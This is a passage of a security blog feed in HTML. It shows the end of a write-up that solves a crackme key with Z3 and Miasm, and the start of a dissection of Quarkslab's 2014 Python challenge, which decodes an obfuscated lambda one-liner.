</span><span class='line'><span class="c"># paste here all the generated algorithm from previous part</span>
</span><span class='line'><span class="c"># BEGIN ALGO</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="o">-</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x0</span><span class="o">|</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>
</span><span class='line'><span class="c"># [...]</span>
</span><span class='line'><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0x1F</span><span class="p">))</span><span class="o">|</span><span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">((((</span><span class="mh">0x0</span><span class="o">|</span><span class="n">i</span><span class="p">)</span><span class="o">^</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0x1F</span><span class="p">)))</span>
</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span>
</span><span class='line'><span class="c"># END ALGO</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">pwd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">solutions</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'><span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span>
</span><span class='line'>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span><span class='line'><span class="n">sol_dw</span> <span class="o">=</span> <span class="p">[</span><span class="n">m</span><span class="p">[</span><span class="n">pwd_orig</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="s">&quot;</span><span class="si">%08x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">dw</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="k">for</span> <span class="n">dw</span> <span class="ow">in</span> <span class="n">sol_dw</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;KEY = </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve declared the valid solution, the list of 6 32-bit variables (<code>pwd</code>), pasted the algorithm, and ran the solver. We just need to be careful with the <code>&gt;&gt;</code> operation, since Z3 <a href="http://stackoverflow.com/a/25535854">treats</a> it as an arithmetic shift, and we want a logical one. So we replace it with a dirty hook.</p>

<p>The solution should come almost instantly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sample_solver.py
</span><span class='line'><span class="nv">KEY</span> <span class="o">=</span> 322644EF941077AB1115AB575363AE87F58E6D9AFE5C62CC
</span></code></pre></td></tr></table></div></figure>


<h2>Alternative solution &ndash; conclusion</h2>

<p>I chose this solution not only to get acquainted with Miasm, but also because it required much less effort and pain :). It fits into approximately 20 lines of GDB script, and 120 of python using Miasm and Z3. You can find all of those in this <a href="https://github.com/egirault/NoSuchCon2014/tree/master/">folder</a>.
I hope it gave you an understandable example of symbolic execution and what you can do with it. However I strongly encourage you to dig into Miasm&rsquo;s code and examples if you want to really understand what&rsquo;s going on under the hood.</p>

<h1>War&rsquo;s over, the final words</h1>

<p>I guess this is where I thank both <a href="https://twitter.com/elvanderb">@elvanderb</a> for this really cool challenge and <a href="https://twitter.com/synacktiv">@synacktiv</a> for letting him write it :&ndash;). <em>Emilien</em> and I also hope you enjoyed the read, feel free to contact any of us if you have any remarks/questions/whatever.</p>

<p>Also, special thanks to <a href="https://twitter.com/__x86">@__x86</a> and <a href="https://twitter.com/jonathansalwan">@jonathansalwan</a> for proofreading!</p>

<p>The codes/traces/tools developed in this post are all available on github <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2014">here</a> and <a href="https://github.com/egirault/NoSuchCon2014/tree/master/">here</a>!</p>

<p>By the way, don&rsquo;t hesitate to contact a member of the staff if you have a cool post you would like to see here &mdash; you too can end up in <a href="https://doar-e.github.io/about/">doar-e&rsquo;s wall of fame</a> :&ndash;).</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Dissection of Quarkslab's 2014 security challenge]]></title>
    <link href="http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge/"/>
    
    <updated>2014-09-06T20:37:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>As the blog was a bit silent for quite some time, I figured it would be cool to put together a post ; so here it is folks, dig in!</p>

<p>The French company <a href="http://blog.quarkslab.com/you-like-python-security-challenge-and-traveling-win-a-free-ticket-to-hitb-kul.html">Quarkslab</a> <a href="https://twitter.com/quarkslab/status/507457671386394624">recently</a> <a href="https://twitter.com/HITBSecConf/status/507458788522094592">released</a> a security challenge to win a free entrance to attend the upcoming <a href="https://conference.hitb.org/hitbsecconf2014kul/">HITBSecConf</a> conference in Kuala Lumpur from the 13th of October until the 16th.</p>

<p>The challenge has been written by <a href="http://blog.quarkslab.com/author/serge-guelton.html">Serge Guelton</a>, a R&amp;D engineer specialized in compilers/parallel computations. At the time of writing, already eight different people manage to solve the challenge, and one of the ticket seems to have been won by <code>hackedd</code>, so congrats to him!</p>

<p><img class="center" src="http://doar-e.github.io/images/dissection_of_quarkslab_s_2014_security_challenge/woot.png"></p>

<p>According to the description of the challenge Python is heavily involved, which is a good thing for at least two reasons:</p>

<ul>
<li>first because I already had <a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">the occasion</a> to look at its source code in the past,</li>
<li>and because I so am a <a href="https://github.com/0vercl0k/stuffz/tree/master/Python's%20internals">big fan of Python</a>.</li>
</ul>


<p>In this post I will describe how I tackled this problem, how I managed to solve it. And to make up for me being slow at solving it I tried to make it fairly detailed.</p>

<p>At first it was supposed to be quite short though, but well..I decided to analyze fully the challenge even if it wasn&rsquo;t needed to find the key unfortunately, so it is a bit longer than expected :&ndash;).</p>

<p>Anyway, sit down, make yourself at home and let me pour you a cup of tea before we begin :&ndash;).</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Finding the URL of the challenge</h1>

<h2>Very one-liner, much lambdas, such a pain</h2>

<p>The first part of the challenge is to retrieve an url hidden in the following Python one-liner:</p>

<figure class='code'><figcaption><span>Very one-liner, much lambdas</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="k">lambda</span> <span class="n">g</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">:</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;chr&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;chr&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="nb">chr</span><span class="p">)((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">_</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)[::(</span><span class="o">-</span><span class="mi">1</span><span class="p">)]])),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])(</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">,</span> <span class="n">_</span><span class="p">:</span> <span class="n">f</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">_</span><span class="p">))((</span><span class="k">lambda</span>
</span><span class='line'><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="p">:</span> <span class="p">((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="n">__</span><span class="p">(</span><span class="n">__</span><span class="p">,</span> <span class="n">_</span><span class="p">))((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span><span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="p">[((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">)[(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span>
</span><span class='line'><span class="p">)]</span> <span class="o">^</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;c&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;c&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">c</span><span class="p">))])),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])(</span><span class="n">_</span><span class="p">)))</span> <span class="k">if</span> <span class="p">(((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;g&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;g&#39;</span> <span class="ow">in</span>
</span><span class='line'><span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">g</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="ow">and</span> <span class="p">((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span><span class="o">&lt;</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;len&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;len&#39;</span> <span class="ow">in</span> <span class="n">_</span>
</span><span class='line'><span class="p">)</span> <span class="k">else</span> <span class="nb">len</span><span class="p">)((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">))))</span> <span class="k">else</span> <span class="n">_</span><span class="p">)),</span> <span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span>
</span><span class='line'><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)]</span> <span class="p">)</span> <span class="p">((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span>
</span><span class='line'><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span>
</span><span class='line'><span class="n">d</span><span class="p">))),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[</span>
</span><span class='line'><span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;j&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">j</span><span class="p">)</span> <span class="k">for</span>  <span class="n">_</span><span class="p">[</span> <span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;zip&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;zip&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span>
</span><span class='line'><span class="nb">zip</span><span class="p">)((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l0&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l0&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l0</span><span class="p">),</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l1&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l1&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l1</span><span class="p">))</span> <span class="k">for</span>
</span><span class='line'><span class="n">_</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="p">])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[</span><span class="mi">1373</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span>
</span><span class='line'><span class="mi">1371</span><span class="p">,</span><span class="mi">1289</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span>
</span><span class='line'><span class="mi">1375</span><span class="p">,</span><span class="mi">1375</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span>
</span><span class='line'><span class="mi">1360</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1362</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1352</span><span class="p">,</span> <span class="mi">1374</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1302</span>
</span><span class='line'><span class="p">]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,[</span><span class="mi">1375</span><span class="p">,</span>
</span><span class='line'><span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1295</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span><span class="mi">1294</span><span class="p">,</span>
</span><span class='line'><span class="mi">1293</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1292</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1291</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span><span class="mi">1373</span><span class="p">,</span>
</span><span class='line'><span class="mi">1371</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span><span class="mi">1368</span><span class="p">,</span>
</span><span class='line'><span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1371</span><span class="p">]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)])</span>
</span><span class='line'>            <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})))))))[</span><span class="s">&#39;$&#39;</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>


<p>I think that was the first time I was seeing obfuscated Python and believe me I did a really strange face when seeing that snippet. But well, with a bit of patience we should manage to get a better understanding of how it is working, let&rsquo;s get to it!</p>

<h2>Tidying up the last one..</h2>

<p>Before doing that here are things we can directly observe just by looking closely at the snippet:</p>

<ul>
<li>We know this function has three arguments ; we don&rsquo;t know them at this point though</li>
<li>The snippet seems to reuse <em>__setitem__</em> quite a lot ; it may mean two things for us:

<ul>
<li>The only standard Python object I know of with a <em>__setitem__</em> function is <em>dictionary</em>,</li>
<li>The way the snippet looks like, it seems that once we will understand one of those <em>__setitem__</em> call, we will understand them all</li>
</ul>
</li>
<li>The following standard functions are used: <em>chr</em>, <em>len</em>, <em>zip</em>

<ul>
<li>That means manipulation of strings, integers and iterables</li>
</ul>
</li>
<li>There are two noticeable operators: <em>mod</em> and <em>xor</em></li>
</ul>


<p>With all that information in our sleeve, the first thing I did was to try to clean it up, starting from the last lambda in the snippet. It gives something like:</p>

<figure class='code'><figcaption><span>Last lambda cleaned</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">tab0</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="mi">1375</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1295</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1280</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1292</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1291</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1371</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1356</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1371</span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>    <span class="n">x</span>
</span><span class='line'><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>That lambda takes a dictionary <em>x</em>, sets two items, generates a tuple with a reference to the dictionary at the end of the tuple ; finally the lambda is going to return that same dictionary.
It also uses <em>x[&lsquo;!&rsquo;]</em> as a temporary variable to then assign its value to <em>x[&lsquo;l0&rsquo;]</em>.</p>

<p>Long story short, it basically takes a dictionary, updates it and returns it to the caller: clever trick to pass that same object across lambdas. We can also see that easily in Python directly:</p>

